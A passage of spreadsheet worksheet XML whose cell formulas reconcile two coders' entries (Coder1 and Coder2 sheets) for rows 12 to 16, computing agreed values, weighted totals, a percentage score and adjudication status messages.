        <f>IF(AND(Coder1!AB12&amp;""&lt;&gt;"",Coder1!AB12&amp;""=Coder2!AB12&amp;""),Coder1!AB12,"")</f>
        <v/>
      </c>
      <c r="AC12" s="14">
        <f>IF(AND(Coder1!AC12&amp;""&lt;&gt;"",Coder1!AC12&amp;""=Coder2!AC12&amp;""),Coder1!AC12,"")</f>
        <v/>
      </c>
      <c r="AD12" s="14">
        <f>IF(AND(Coder1!AD12&amp;""&lt;&gt;"",Coder1!AD12&amp;""=Coder2!AD12&amp;""),Coder1!AD12,"")</f>
        <v/>
      </c>
      <c r="AE12" s="14">
        <f>IF(AND(Coder1!AE12&amp;""&lt;&gt;"",Coder1!AE12&amp;""=Coder2!AE12&amp;""),Coder1!AE12,"")</f>
        <v/>
      </c>
      <c r="AF12" s="14">
        <f>IF(AND(Coder1!AF12&amp;""&lt;&gt;"",Coder1!AF12&amp;""=Coder2!AF12&amp;""),Coder1!AF12,"")</f>
        <v/>
      </c>
      <c r="AG12" s="14">
        <f>IF(AND(Coder1!AG12&amp;""&lt;&gt;"",Coder1!AG12&amp;""=Coder2!AG12&amp;""),Coder1!AG12,"")</f>
        <v/>
      </c>
      <c r="AH12" s="14">
        <f>IF(AND(Coder1!AH12&amp;""&lt;&gt;"",Coder1!AH12&amp;""=Coder2!AH12&amp;""),Coder1!AH12,"")</f>
        <v/>
      </c>
      <c r="AI12" s="11">
        <f>IF(COUNT(E12:L12)=0,"",SUM(E12:L12))</f>
        <v/>
      </c>
      <c r="AJ12" s="11">
        <f>IF(AI12="","",N(E12)*3+N(F12)*2+N(G12)*2+N(H12)*2+N(I12)*2+N(J12)*3+N(K12)*3+N(L12)*3)</f>
        <v/>
      </c>
      <c r="AK12" s="11">
        <f>IF(AI12="","",COUNTIF(N12:AG12,1))</f>
        <v/>
      </c>
      <c r="AL12" s="11">
        <f>IF(OR(AJ12="",AJ12=0),"",ROUND(100*(AJ12-AK12)/AJ12,1))</f>
        <v/>
      </c>
      <c r="AM12" s="11">
        <f>IF(AND(Coder1!AN12=1,Coder2!AN12=1),IF(COUNTBLANK(E12:AH12)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN12" s="11">
        <f>IF(AND(Coder1!AN12=1,Coder2!AN12=1),IF(SUMPRODUCT(--(Coder1!E12:AH12&amp;""&lt;&gt;Coder2!E12:AH12&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO12" s="11" t="n"/>
    </row>
    <row r="13">
      <c r="A13" s="11">
        <f>Coder1!A13</f>
        <v/>
      </c>
      <c r="B13" s="11">
        <f>Coder1!B13</f>
        <v/>
      </c>
      <c r="C13" s="11">
        <f>Coder1!C13</f>
        <v/>
      </c>
      <c r="D13" s="11">
        <f>Coder1!D13</f>
        <v/>
      </c>
      <c r="E13" s="14">
        <f>IF(AND(Coder1!E13&amp;""&lt;&gt;"",Coder1!E13&amp;""=Coder2!E13&amp;""),Coder1!E13,"")</f>
        <v/>
      </c>
      <c r="F13" s="14">
        <f>IF(AND(Coder1!F13&amp;""&lt;&gt;"",Coder1!F13&amp;""=Coder2!F13&amp;""),Coder1!F13,"")</f>
        <v/>
      </c>
      <c r="G13" s="14">
        <f>IF(AND(Coder1!G13&amp;""&lt;&gt;"",Coder1!G13&amp;""=Coder2!G13&amp;""),Coder1!G13,"")</f>
        <v/>
      </c>
      <c r="H13" s="14">
        <f>IF(AND(Coder1!H13&amp;""&lt;&gt;"",Coder1!H13&amp;""=Coder2!H13&amp;""),Coder1!H13,"")</f>
        <v/>
      </c>
      <c r="I13" s="14">
        <f>IF(AND(Coder1!I13&amp;""&lt;&gt;"",Coder1!I13&amp;""=Coder2!I13&amp;""),Coder1!I13,"")</f>
        <v/>
      </c>
      <c r="J13" s="14">
        <f>IF(AND(Coder1!J13&amp;""&lt;&gt;"",Coder1!J13&amp;""=Coder2!J13&amp;""),Coder1!J13,"")</f>
        <v/>
      </c>
      <c r="K13" s="14">
        <f>IF(AND(Coder1!K13&amp;""&lt;&gt;"",Coder1!K13&amp;""=Coder2!K13&amp;""),Coder1!K13,"")</f>
        <v/>
      </c>
      <c r="L13" s="14">
        <f>IF(AND(Coder1!L13&amp;""&lt;&gt;"",Coder1!L13&amp;""=Coder2!L13&amp;""),Coder1!L13,"")</f>
        <v/>
      </c>
      <c r="M13" s="14">
        <f>IF(AND(Coder1!M13&amp;""&lt;&gt;"",Coder1!M13&amp;""=Coder2!M13&amp;""),Coder1!M13,"")</f>
        <v/>
      </c>
      <c r="N13" s="14">
        <f>IF(AND(Coder1!N13&amp;""&lt;&gt;"",Coder1!N13&amp;""=Coder2!N13&amp;""),Coder1!N13,"")</f>
        <v/>
      </c>
      <c r="O13" s="14">
        <f>IF(AND(Coder1!O13&amp;""&lt;&gt;"",Coder1!O13&amp;""=Coder2!O13&amp;""),Coder1!O13,"")</f>
        <v/>
      </c>
      <c r="P13" s="14">
        <f>IF(AND(Coder1!P13&amp;""&lt;&gt;"",Coder1!P13&amp;""=Coder2!P13&amp;""),Coder1!P13,"")</f>
        <v/>
      </c>
      <c r="Q13" s="14">
        <f>IF(AND(Coder1!Q13&amp;""&lt;&gt;"",Coder1!Q13&amp;""=Coder2!Q13&amp;""),Coder1!Q13,"")</f>
        <v/>
      </c>
      <c r="R13" s="14">
        <f>IF(AND(Coder1!R13&amp;""&lt;&gt;"",Coder1!R13&amp;""=Coder2!R13&amp;""),Coder1!R13,"")</f>
        <v/>
      </c>
      <c r="S13" s="14">
        <f>IF(AND(Coder1!S13&amp;""&lt;&gt;"",Coder1!S13&amp;""=Coder2!S13&amp;""),Coder1!S13,"")</f>
        <v/>
      </c>
      <c r="T13" s="14">
        <f>IF(AND(Coder1!T13&amp;""&lt;&gt;"",Coder1!T13&amp;""=Coder2!T13&amp;""),Coder1!T13,"")</f>
        <v/>
      </c>
      <c r="U13" s="14">
        <f>IF(AND(Coder1!U13&amp;""&lt;&gt;"",Coder1!U13&amp;""=Coder2!U13&amp;""),Coder1!U13,"")</f>
        <v/>
      </c>
      <c r="V13" s="14">
        <f>IF(AND(Coder1!V13&amp;""&lt;&gt;"",Coder1!V13&amp;""=Coder2!V13&amp;""),Coder1!V13,"")</f>
        <v/>
      </c>
      <c r="W13" s="14">
        <f>IF(AND(Coder1!W13&amp;""&lt;&gt;"",Coder1!W13&amp;""=Coder2!W13&amp;""),Coder1!W13,"")</f>
        <v/>
      </c>
      <c r="X13" s="14">
        <f>IF(AND(Coder1!X13&amp;""&lt;&gt;"",Coder1!X13&amp;""=Coder2!X13&amp;""),Coder1!X13,"")</f>
        <v/>
      </c>
      <c r="Y13" s="14">
        <f>IF(AND(Coder1!Y13&amp;""&lt;&gt;"",Coder1!Y13&amp;""=Coder2!Y13&amp;""),Coder1!Y13,"")</f>
        <v/>
      </c>
      <c r="Z13" s="14">
        <f>IF(AND(Coder1!Z13&amp;""&lt;&gt;"",Coder1!Z13&amp;""=Coder2!Z13&amp;""),Coder1!Z13,"")</f>
        <v/>
      </c>
      <c r="AA13" s="14">
        <f>IF(AND(Coder1!AA13&amp;""&lt;&gt;"",Coder1!AA13&amp;""=Coder2!AA13&amp;""),Coder1!AA13,"")</f>
        <v/>
      </c>
      <c r="AB13" s="14">
        <f>IF(AND(Coder1!AB13&amp;""&lt;&gt;"",Coder1!AB13&amp;""=Coder2!AB13&amp;""),Coder1!AB13,"")</f>
        <v/>
      </c>
      <c r="AC13" s="14">
        <f>IF(AND(Coder1!AC13&amp;""&lt;&gt;"",Coder1!AC13&amp;""=Coder2!AC13&amp;""),Coder1!AC13,"")</f>
        <v/>
      </c>
      <c r="AD13" s="14">
        <f>IF(AND(Coder1!AD13&amp;""&lt;&gt;"",Coder1!AD13&amp;""=Coder2!AD13&amp;""),Coder1!AD13,"")</f>
        <v/>
      </c>
      <c r="AE13" s="14">
        <f>IF(AND(Coder1!AE13&amp;""&lt;&gt;"",Coder1!AE13&amp;""=Coder2!AE13&amp;""),Coder1!AE13,"")</f>
        <v/>
      </c>
      <c r="AF13" s="14">
        <f>IF(AND(Coder1!AF13&amp;""&lt;&gt;"",Coder1!AF13&amp;""=Coder2!AF13&amp;""),Coder1!AF13,"")</f>
        <v/>
      </c>
      <c r="AG13" s="14">
        <f>IF(AND(Coder1!AG13&amp;""&lt;&gt;"",Coder1!AG13&amp;""=Coder2!AG13&amp;""),Coder1!AG13,"")</f>
        <v/>
      </c>
      <c r="AH13" s="14">
        <f>IF(AND(Coder1!AH13&amp;""&lt;&gt;"",Coder1!AH13&amp;""=Coder2!AH13&amp;""),Coder1!AH13,"")</f>
        <v/>
      </c>
      <c r="AI13" s="11">
        <f>IF(COUNT(E13:L13)=0,"",SUM(E13:L13))</f>
        <v/>
      </c>
      <c r="AJ13" s="11">
        <f>IF(AI13="","",N(E13)*3+N(F13)*2+N(G13)*2+N(H13)*2+N(I13)*2+N(J13)*3+N(K13)*3+N(L13)*3)</f>
        <v/>
      </c>
      <c r="AK13" s="11">
        <f>IF(AI13="","",COUNTIF(N13:AG13,1))</f>
        <v/>
      </c>
      <c r="AL13" s="11">
        <f>IF(OR(AJ13="",AJ13=0),"",ROUND(100*(AJ13-AK13)/AJ13,1))</f>
        <v/>
      </c>
      <c r="AM13" s="11">
        <f>IF(AND(Coder1!AN13=1,Coder2!AN13=1),IF(COUNTBLANK(E13:AH13)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN13" s="11">
        <f>IF(AND(Coder1!AN13=1,Coder2!AN13=1),IF(SUMPRODUCT(--(Coder1!E13:AH13&amp;""&lt;&gt;Coder2!E13:AH13&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO13" s="11" t="n"/>
    </row>
    <row r="14">
      <c r="A14" s="11">
        <f>Coder1!A14</f>
        <v/>
      </c>
      <c r="B14" s="11">
        <f>Coder1!B14</f>
        <v/>
      </c>
      <c r="C14" s="11">
        <f>Coder1!C14</f>
        <v/>
      </c>
      <c r="D14" s="11">
        <f>Coder1!D14</f>
        <v/>
      </c>
      <c r="E14" s="14">
        <f>IF(AND(Coder1!E14&amp;""&lt;&gt;"",Coder1!E14&amp;""=Coder2!E14&amp;""),Coder1!E14,"")</f>
        <v/>
      </c>
      <c r="F14" s="14">
        <f>IF(AND(Coder1!F14&amp;""&lt;&gt;"",Coder1!F14&amp;""=Coder2!F14&amp;""),Coder1!F14,"")</f>
        <v/>
      </c>
      <c r="G14" s="14">
        <f>IF(AND(Coder1!G14&amp;""&lt;&gt;"",Coder1!G14&amp;""=Coder2!G14&amp;""),Coder1!G14,"")</f>
        <v/>
      </c>
      <c r="H14" s="14">
        <f>IF(AND(Coder1!H14&amp;""&lt;&gt;"",Coder1!H14&amp;""=Coder2!H14&amp;""),Coder1!H14,"")</f>
        <v/>
      </c>
      <c r="I14" s="14">
        <f>IF(AND(Coder1!I14&amp;""&lt;&gt;"",Coder1!I14&amp;""=Coder2!I14&amp;""),Coder1!I14,"")</f>
        <v/>
      </c>
      <c r="J14" s="14">
        <f>IF(AND(Coder1!J14&amp;""&lt;&gt;"",Coder1!J14&amp;""=Coder2!J14&amp;""),Coder1!J14,"")</f>
        <v/>
      </c>
      <c r="K14" s="14">
        <f>IF(AND(Coder1!K14&amp;""&lt;&gt;"",Coder1!K14&amp;""=Coder2!K14&amp;""),Coder1!K14,"")</f>
        <v/>
      </c>
      <c r="L14" s="14">
        <f>IF(AND(Coder1!L14&amp;""&lt;&gt;"",Coder1!L14&amp;""=Coder2!L14&amp;""),Coder1!L14,"")</f>
        <v/>
      </c>
      <c r="M14" s="14">
        <f>IF(AND(Coder1!M14&amp;""&lt;&gt;"",Coder1!M14&amp;""=Coder2!M14&amp;""),Coder1!M14,"")</f>
        <v/>
      </c>
      <c r="N14" s="14">
        <f>IF(AND(Coder1!N14&amp;""&lt;&gt;"",Coder1!N14&amp;""=Coder2!N14&amp;""),Coder1!N14,"")</f>
        <v/>
      </c>
      <c r="O14" s="14">
        <f>IF(AND(Coder1!O14&amp;""&lt;&gt;"",Coder1!O14&amp;""=Coder2!O14&amp;""),Coder1!O14,"")</f>
        <v/>
      </c>
      <c r="P14" s="14">
        <f>IF(AND(Coder1!P14&amp;""&lt;&gt;"",Coder1!P14&amp;""=Coder2!P14&amp;""),Coder1!P14,"")</f>
        <v/>
      </c>
      <c r="Q14" s="14">
        <f>IF(AND(Coder1!Q14&amp;""&lt;&gt;"",Coder1!Q14&amp;""=Coder2!Q14&amp;""),Coder1!Q14,"")</f>
        <v/>
      </c>
      <c r="R14" s="14">
        <f>IF(AND(Coder1!R14&amp;""&lt;&gt;"",Coder1!R14&amp;""=Coder2!R14&amp;""),Coder1!R14,"")</f>
        <v/>
      </c>
      <c r="S14" s="14">
        <f>IF(AND(Coder1!S14&amp;""&lt;&gt;"",Coder1!S14&amp;""=Coder2!S14&amp;""),Coder1!S14,"")</f>
        <v/>
      </c>
      <c r="T14" s="14">
        <f>IF(AND(Coder1!T14&amp;""&lt;&gt;"",Coder1!T14&amp;""=Coder2!T14&amp;""),Coder1!T14,"")</f>
        <v/>
      </c>
      <c r="U14" s="14">
        <f>IF(AND(Coder1!U14&amp;""&lt;&gt;"",Coder1!U14&amp;""=Coder2!U14&amp;""),Coder1!U14,"")</f>
        <v/>
      </c>
      <c r="V14" s="14">
        <f>IF(AND(Coder1!V14&amp;""&lt;&gt;"",Coder1!V14&amp;""=Coder2!V14&amp;""),Coder1!V14,"")</f>
        <v/>
      </c>
      <c r="W14" s="14">
        <f>IF(AND(Coder1!W14&amp;""&lt;&gt;"",Coder1!W14&amp;""=Coder2!W14&amp;""),Coder1!W14,"")</f>
        <v/>
      </c>
      <c r="X14" s="14">
        <f>IF(AND(Coder1!X14&amp;""&lt;&gt;"",Coder1!X14&amp;""=Coder2!X14&amp;""),Coder1!X14,"")</f>
        <v/>
      </c>
      <c r="Y14" s="14">
        <f>IF(AND(Coder1!Y14&amp;""&lt;&gt;"",Coder1!Y14&amp;""=Coder2!Y14&amp;""),Coder1!Y14,"")</f>
        <v/>
      </c>
      <c r="Z14" s="14">
        <f>IF(AND(Coder1!Z14&amp;""&lt;&gt;"",Coder1!Z14&amp;""=Coder2!Z14&amp;""),Coder1!Z14,"")</f>
        <v/>
      </c>
      <c r="AA14" s="14">
        <f>IF(AND(Coder1!AA14&amp;""&lt;&gt;"",Coder1!AA14&amp;""=Coder2!AA14&amp;""),Coder1!AA14,"")</f>
        <v/>
      </c>
      <c r="AB14" s="14">
        <f>IF(AND(Coder1!AB14&amp;""&lt;&gt;"",Coder1!AB14&amp;""=Coder2!AB14&amp;""),Coder1!AB14,"")</f>
        <v/>
      </c>
      <c r="AC14" s="14">
        <f>IF(AND(Coder1!AC14&amp;""&lt;&gt;"",Coder1!AC14&amp;""=Coder2!AC14&amp;""),Coder1!AC14,"")</f>
        <v/>
      </c>
      <c r="AD14" s="14">
        <f>IF(AND(Coder1!AD14&amp;""&lt;&gt;"",Coder1!AD14&amp;""=Coder2!AD14&amp;""),Coder1!AD14,"")</f>
        <v/>
      </c>
      <c r="AE14" s="14">
        <f>IF(AND(Coder1!AE14&amp;""&lt;&gt;"",Coder1!AE14&amp;""=Coder2!AE14&amp;""),Coder1!AE14,"")</f>
        <v/>
      </c>
      <c r="AF14" s="14">
        <f>IF(AND(Coder1!AF14&amp;""&lt;&gt;"",Coder1!AF14&amp;""=Coder2!AF14&amp;""),Coder1!AF14,"")</f>
        <v/>
      </c>
      <c r="AG14" s="14">
        <f>IF(AND(Coder1!AG14&amp;""&lt;&gt;"",Coder1!AG14&amp;""=Coder2!AG14&amp;""),Coder1!AG14,"")</f>
        <v/>
      </c>
      <c r="AH14" s="14">
        <f>IF(AND(Coder1!AH14&amp;""&lt;&gt;"",Coder1!AH14&amp;""=Coder2!AH14&amp;""),Coder1!AH14,"")</f>
        <v/>
      </c>
      <c r="AI14" s="11">
        <f>IF(COUNT(E14:L14)=0,"",SUM(E14:L14))</f>
        <v/>
      </c>
      <c r="AJ14" s="11">
        <f>IF(AI14="","",N(E14)*3+N(F14)*2+N(G14)*2+N(H14)*2+N(I14)*2+N(J14)*3+N(K14)*3+N(L14)*3)</f>
        <v/>
      </c>
      <c r="AK14" s="11">
        <f>IF(AI14="","",COUNTIF(N14:AG14,1))</f>
        <v/>
      </c>
      <c r="AL14" s="11">
        <f>IF(OR(AJ14="",AJ14=0),"",ROUND(100*(AJ14-AK14)/AJ14,1))</f>
        <v/>
      </c>
      <c r="AM14" s="11">
        <f>IF(AND(Coder1!AN14=1,Coder2!AN14=1),IF(COUNTBLANK(E14:AH14)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN14" s="11">
        <f>IF(AND(Coder1!AN14=1,Coder2!AN14=1),IF(SUMPRODUCT(--(Coder1!E14:AH14&amp;""&lt;&gt;Coder2!E14:AH14&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO14" s="11" t="n"/>
    </row>
    <row r="15">
      <c r="A15" s="11">
        <f>Coder1!A15</f>
        <v/>
      </c>
      <c r="B15" s="11">
        <f>Coder1!B15</f>
        <v/>
      </c>
      <c r="C15" s="11">
        <f>Coder1!C15</f>
        <v/>
      </c>
      <c r="D15" s="11">
        <f>Coder1!D15</f>
        <v/>
      </c>
      <c r="E15" s="14">
        <f>IF(AND(Coder1!E15&amp;""&lt;&gt;"",Coder1!E15&amp;""=Coder2!E15&amp;""),Coder1!E15,"")</f>
        <v/>
      </c>
      <c r="F15" s="14">
        <f>IF(AND(Coder1!F15&amp;""&lt;&gt;"",Coder1!F15&amp;""=Coder2!F15&amp;""),Coder1!F15,"")</f>
        <v/>
      </c>
      <c r="G15" s="14">
        <f>IF(AND(Coder1!G15&amp;""&lt;&gt;"",Coder1!G15&amp;""=Coder2!G15&amp;""),Coder1!G15,"")</f>
        <v/>
      </c>
      <c r="H15" s="14">
        <f>IF(AND(Coder1!H15&amp;""&lt;&gt;"",Coder1!H15&amp;""=Coder2!H15&amp;""),Coder1!H15,"")</f>
        <v/>
      </c>
      <c r="I15" s="14">
        <f>IF(AND(Coder1!I15&amp;""&lt;&gt;"",Coder1!I15&amp;""=Coder2!I15&amp;""),Coder1!I15,"")</f>
        <v/>
      </c>
      <c r="J15" s="14">
        <f>IF(AND(Coder1!J15&amp;""&lt;&gt;"",Coder1!J15&amp;""=Coder2!J15&amp;""),Coder1!J15,"")</f>
        <v/>
      </c>
      <c r="K15" s="14">
        <f>IF(AND(Coder1!K15&amp;""&lt;&gt;"",Coder1!K15&amp;""=Coder2!K15&amp;""),Coder1!K15,"")</f>
        <v/>
      </c>
      <c r="L15" s="14">
        <f>IF(AND(Coder1!L15&amp;""&lt;&gt;"",Coder1!L15&amp;""=Coder2!L15&amp;""),Coder1!L15,"")</f>
        <v/>
      </c>
      <c r="M15" s="14">
        <f>IF(AND(Coder1!M15&amp;""&lt;&gt;"",Coder1!M15&amp;""=Coder2!M15&amp;""),Coder1!M15,"")</f>
        <v/>
      </c>
      <c r="N15" s="14">
        <f>IF(AND(Coder1!N15&amp;""&lt;&gt;"",Coder1!N15&amp;""=Coder2!N15&amp;""),Coder1!N15,"")</f>
        <v/>
      </c>
      <c r="O15" s="14">
        <f>IF(AND(Coder1!O15&amp;""&lt;&gt;"",Coder1!O15&amp;""=Coder2!O15&amp;""),Coder1!O15,"")</f>
        <v/>
      </c>
      <c r="P15" s="14">
        <f>IF(AND(Coder1!P15&amp;""&lt;&gt;"",Coder1!P15&amp;""=Coder2!P15&amp;""),Coder1!P15,"")</f>
        <v/>
      </c>
      <c r="Q15" s="14">
        <f>IF(AND(Coder1!Q15&amp;""&lt;&gt;"",Coder1!Q15&amp;""=Coder2!Q15&amp;""),Coder1!Q15,"")</f>
        <v/>
      </c>
      <c r="R15" s="14">
        <f>IF(AND(Coder1!R15&amp;""&lt;&gt;"",Coder1!R15&amp;""=Coder2!R15&amp;""),Coder1!R15,"")</f>
        <v/>
      </c>
      <c r="S15" s="14">
        <f>IF(AND(Coder1!S15&amp;""&lt;&gt;"",Coder1!S15&amp;""=Coder2!S15&amp;""),Coder1!S15,"")</f>
        <v/>
      </c>
      <c r="T15" s="14">
        <f>IF(AND(Coder1!T15&amp;""&lt;&gt;"",Coder1!T15&amp;""=Coder2!T15&amp;""),Coder1!T15,"")</f>
        <v/>
      </c>
      <c r="U15" s="14">
        <f>IF(AND(Coder1!U15&amp;""&lt;&gt;"",Coder1!U15&amp;""=Coder2!U15&amp;""),Coder1!U15,"")</f>
        <v/>
      </c>
      <c r="V15" s="14">
        <f>IF(AND(Coder1!V15&amp;""&lt;&gt;"",Coder1!V15&amp;""=Coder2!V15&amp;""),Coder1!V15,"")</f>
        <v/>
      </c>
      <c r="W15" s="14">
        <f>IF(AND(Coder1!W15&amp;""&lt;&gt;"",Coder1!W15&amp;""=Coder2!W15&amp;""),Coder1!W15,"")</f>
        <v/>
      </c>
      <c r="X15" s="14">
        <f>IF(AND(Coder1!X15&amp;""&lt;&gt;"",Coder1!X15&amp;""=Coder2!X15&amp;""),Coder1!X15,"")</f>
        <v/>
      </c>
      <c r="Y15" s="14">
        <f>IF(AND(Coder1!Y15&amp;""&lt;&gt;"",Coder1!Y15&amp;""=Coder2!Y15&amp;""),Coder1!Y15,"")</f>
        <v/>
      </c>
      <c r="Z15" s="14">
        <f>IF(AND(Coder1!Z15&amp;""&lt;&gt;"",Coder1!Z15&amp;""=Coder2!Z15&amp;""),Coder1!Z15,"")</f>
        <v/>
      </c>
      <c r="AA15" s="14">
        <f>IF(AND(Coder1!AA15&amp;""&lt;&gt;"",Coder1!AA15&amp;""=Coder2!AA15&amp;""),Coder1!AA15,"")</f>
        <v/>
      </c>
      <c r="AB15" s="14">
        <f>IF(AND(Coder1!AB15&amp;""&lt;&gt;"",Coder1!AB15&amp;""=Coder2!AB15&amp;""),Coder1!AB15,"")</f>
        <v/>
      </c>
      <c r="AC15" s="14">
        <f>IF(AND(Coder1!AC15&amp;""&lt;&gt;"",Coder1!AC15&amp;""=Coder2!AC15&amp;""),Coder1!AC15,"")</f>
        <v/>
      </c>
      <c r="AD15" s="14">
        <f>IF(AND(Coder1!AD15&amp;""&lt;&gt;"",Coder1!AD15&amp;""=Coder2!AD15&amp;""),Coder1!AD15,"")</f>
        <v/>
      </c>
      <c r="AE15" s="14">
        <f>IF(AND(Coder1!AE15&amp;""&lt;&gt;"",Coder1!AE15&amp;""=Coder2!AE15&amp;""),Coder1!AE15,"")</f>
        <v/>
      </c>
      <c r="AF15" s="14">
        <f>IF(AND(Coder1!AF15&amp;""&lt;&gt;"",Coder1!AF15&amp;""=Coder2!AF15&amp;""),Coder1!AF15,"")</f>
        <v/>
      </c>
      <c r="AG15" s="14">
        <f>IF(AND(Coder1!AG15&amp;""&lt;&gt;"",Coder1!AG15&amp;""=Coder2!AG15&amp;""),Coder1!AG15,"")</f>
        <v/>
      </c>
      <c r="AH15" s="14">
        <f>IF(AND(Coder1!AH15&amp;""&lt;&gt;"",Coder1!AH15&amp;""=Coder2!AH15&amp;""),Coder1!AH15,"")</f>
        <v/>
      </c>
      <c r="AI15" s="11">
        <f>IF(COUNT(E15:L15)=0,"",SUM(E15:L15))</f>
        <v/>
      </c>
      <c r="AJ15" s="11">
        <f>IF(AI15="","",N(E15)*3+N(F15)*2+N(G15)*2+N(H15)*2+N(I15)*2+N(J15)*3+N(K15)*3+N(L15)*3)</f>
        <v/>
      </c>
      <c r="AK15" s="11">
        <f>IF(AI15="","",COUNTIF(N15:AG15,1))</f>
        <v/>
      </c>
      <c r="AL15" s="11">
        <f>IF(OR(AJ15="",AJ15=0),"",ROUND(100*(AJ15-AK15)/AJ15,1))</f>
        <v/>
      </c>
      <c r="AM15" s="11">
        <f>IF(AND(Coder1!AN15=1,Coder2!AN15=1),IF(COUNTBLANK(E15:AH15)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN15" s="11">
        <f>IF(AND(Coder1!AN15=1,Coder2!AN15=1),IF(SUMPRODUCT(--(Coder1!E15:AH15&amp;""&lt;&gt;Coder2!E15:AH15&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO15" s="11" t="n"/>
    </row>
    <row r="16">
      <c r="A16" s="11">
        <f>Coder1!A16</f>
        <v/>
      </c>
      <c r="B16" s="11">
        <f>Coder1!B16</f>
        <v/>
      </c>
      <c r="C16" s="11">
        <f>Coder1!C16</f>
        <v/>
      </c>
      <c r="D16" s="11">
        <f>Coder1!D16</f>
        <v/>
      </c>
      <c r="E16" s="14">
        <f>IF(AND(Coder1!E16&amp;""&lt;&gt;"",Coder1!E16&amp;""=Coder2!E16&amp;""),Coder1!E16,"")</f>
        <v/>
      </c>
      <c r="F16" s="14">
        <f>IF(AND(Coder1!F16&amp;""&lt;&gt;"",Coder1!F16&amp;""=Coder2!F16&amp;""),Coder1!F16,"")</f>
        <v/>
      </c>
      <c r="G16" s="14">
        <f>IF(AND(Coder1!G16&amp;""&lt;&gt;"",Coder1!G16&amp;""=Coder2!G16&amp;""),Coder1!G16,"")</f>
        <v/>
      </c>
      <c r="H16" s="14">
        <f>IF(AND(Coder1!H16&amp;""&lt;&gt;"",Coder1!H16&amp;""=Coder2!H16&amp;""),Coder1!H16,"")</f>
        <v/>
      </c>
      <c r="I16" s="14">
        <f>IF(AND(Coder1!I16&amp;""&lt;&gt;"",Coder1!I16&amp;""=Coder2!I16&amp;""),Coder1!I16,"")</f>
        <v/>
      </c>
      <c r="J16" s="14">
        <f>IF(AND(Coder1!J16&amp;""&lt;&gt;"",Coder1!J16&amp;""=Coder2!J16&amp;""),Coder1!J16,"")</f>
        <v/>
      </c>
      <c r="K16" s="14">
        <f>IF(AND(Coder1!K16&amp;""&lt;&gt;"",Coder1!K16&amp;""=Coder2!K16&amp;""),Coder1!K16,"")</f>
        <v/>
      </c>
      <c r="L16" s="14">
        <f>IF(AND(Coder1!L16&amp;""&lt;&gt;"",Coder1!L16&amp;""=Coder2!L16&amp;""),Coder1!L16,"")</f>
        <v/>
      </c>
      <c r="M16" s="14">
        <f>IF(AND(Coder1!M16&amp;""&lt;&gt;"",Coder1!M16&amp;""=Coder2!M16&amp;""),Coder1!M16,"")</f>
        <v/>
      </c>
      <c r="N16" s="14">
        <f>IF(AND(Coder1!N16&amp;""&lt;&gt;"",Coder1!N16&amp;""=Coder2!N16&amp;""),Coder1!N16,"")</f>
        <v/>
      </c>
      <c r="O16" s="14">
        <f>IF(AND(Coder1!O16&amp;""&lt;&gt;"",Coder1!O16&amp;""=Coder2!O16&amp;""),Coder1!O16,"")</f>
        <v/>
      </c>
      <c r="P16" s="14">
        <f>IF(AND(Coder1!P16&amp;""&lt;&gt;"",Coder1!P16&amp;""=Coder2!P16&amp;""),Coder1!P16,"")</f>
        <v/>
      </c>
      <c r="Q16" s="14">
        <f>IF(AND(Coder1!Q16&amp;""&lt;&gt;"",Coder1!Q16&amp;""=Coder2!Q16&amp;""),Coder1!Q16,"")</f>
        <v/>
      </c>
      <c r="R16" s="14">
        <f>IF(AND(Coder1!R16&amp;""&lt;&gt;"",Coder1!R16&amp;""=Coder2!R16&amp;""),Coder1!R16,"")</f>
        <v/>
      </c>
      <c r="S16" s="14">
        <f>IF(AND(Coder1!S16&amp;""&lt;&gt;"",Coder1!S16&amp;""=Coder2!S16&amp;""),Coder1!S16,"")</f>
        <v/>
      </c>
      <c r="T16" s="14">
        <f>IF(AND(Coder1!T16&amp;""&lt;&gt;"",Coder1!T16&amp;""=Coder2!T16&amp;""),Coder1!T16,"")</f>
        <v/>
      </c>
      <c r="U16" s="14">
        <f>IF(AND(Coder1!U16&amp;""&lt;&gt;"",Coder1!U16&amp;""=Coder2!U16&amp;""),Coder1!U16,"")</f>
        <v/>
      </c>
      <c r="V16" s="14">
        <f>IF(AND(Coder1!V16&amp;""&lt;&gt;"",Coder1!V16&amp;""=Coder2!V16&amp;""),Coder1!V16,"")</f>
        <v/>
      </c>
      <c r="W16" s="14">
        <f>IF(AND(Coder1!W16&amp;""&lt;&gt;"",Coder1!W16&amp;""=Coder2!W16&amp;""),Coder1!W16,"")</f>
        <v/>
      </c>
      <c r="X16" s="14">
        <f>IF(AND(Coder1!X16&amp;""&lt;&gt;"",Coder1!X16&amp;""=Coder2!X16&amp;""),Coder1!X16,"")</f>
        <v/>
      </c>
      <c r="Y16" s="14">
        <f>IF(AND(Coder1!Y16&amp;""&lt;&gt;"",Coder1!Y16&amp;""=Coder2!Y16&amp;""),Coder1!Y16,"")</f>
        <v/>
      </c>
      <c r="Z16" s="14">
        <f>IF(AND(Coder1!Z16&amp;""&lt;&gt;"",Coder1!Z16&amp;""=Coder2!Z16&amp;""),Coder1!Z16,"")</f>
        <v/>
      </c>
      <c r="AA16" s="14">
        <f>IF(AND(Coder1!AA16&amp;""&lt;&gt;"",Coder1!AA16&amp;""=Coder2!AA16&amp;""),Coder1!AA16,"")</f>
        <v/>
      </c>
      <c r="AB16" s="14">
        <f>IF(AND(Coder1!AB16&amp;""&lt;&gt;"",Coder1!AB16&amp;""=Coder2!AB16&amp;""),Coder1!AB16,"")</f>
        <v/>
      </c>
      <c r="AC16" s="14">
        <f>IF(AND(Coder1!AC16&amp;""&lt;&gt;"",Coder1!AC16&amp;""=Coder2!AC16&amp;""),Coder1!AC16,"")</f>
        <v/>
      </c>
      <c r="AD16" s="14">
        <f>IF(AND(Coder1!AD16&amp;""&lt;&gt;"",Coder1!AD16&amp;""=Coder2!AD16&amp;""),Coder1!AD16,"")</f>
        <v/>
      </c>
      <c r="AE16" s="14">
